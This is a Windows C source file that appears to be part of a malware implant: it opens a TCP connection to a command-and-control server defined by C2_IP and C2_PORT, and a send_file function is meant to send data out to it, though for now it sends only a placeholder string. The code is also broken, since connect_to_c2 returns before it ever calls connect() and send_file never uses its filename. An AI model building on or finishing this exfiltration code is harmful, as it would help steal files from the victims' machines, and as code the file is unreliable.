#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

#include "c2.h"

static void connect_to_c2(SOCKET *sock, SOCKADDR_IN *client){
    int err;
    // loading winsocket.dll
    WSADATA wsaData = {0};
    err = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (err != 0){
        printf("DEBUG: connect_to_c2: Error while loading winsocker.dll: Error %d\n", err);
        exit(-1);
    }

    *sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (*sock == INVALID_SOCKET) {
        err = WSAGetLastError();
        printf("DEBUG: connect_to_c2: Error while creating the socket: Error %d\n", err);
        exit(-1);
    }
    return;

    // connecting to the c2 server
    err = connect(*sock, (SOCKADDR *)client, sizeof(*client));
    if (err == SOCKET_ERROR){
        printf("DEBUG: connect_to_c2: Error while creating the client: Error %d\n", WSAGetLastError());
        exit(-1);
    }
    printf("INFO: connect_to_c2: Successfully connected to the c2 server");
}

static void close_c2_conn(SOCKET *sock){
    // closing the server
    int err = closesocket(*sock);
    if (err == SOCKET_ERROR){
        printf("DEBUG: close_c2_conn: Error while closing the connection: Error %d\n", WSAGetLastError());
        exit(-1);
    }
    return;
}

void send_file(WCHAR * filename){
    SOCKET sock;
    // Creating the client
    SOCKADDR_IN client;
    client.sin_family = AF_INET;
    client.sin_addr.S_un.S_addr = inet_addr(C2_IP);
    client.sin_port = htons(C2_PORT);
    
    // initating the connection to the c2 server
    connect_to_c2(&sock, &client);

    int err = send(sock, "feur", 4, 0);
    if (err == SOCKET_ERROR){
        printf("DEBUG: send_file: Error while sending data to server: Error %d\n", WSAGetLastError());
        exit(-1);
    }

    close_c2_conn(&sock);
    return;
}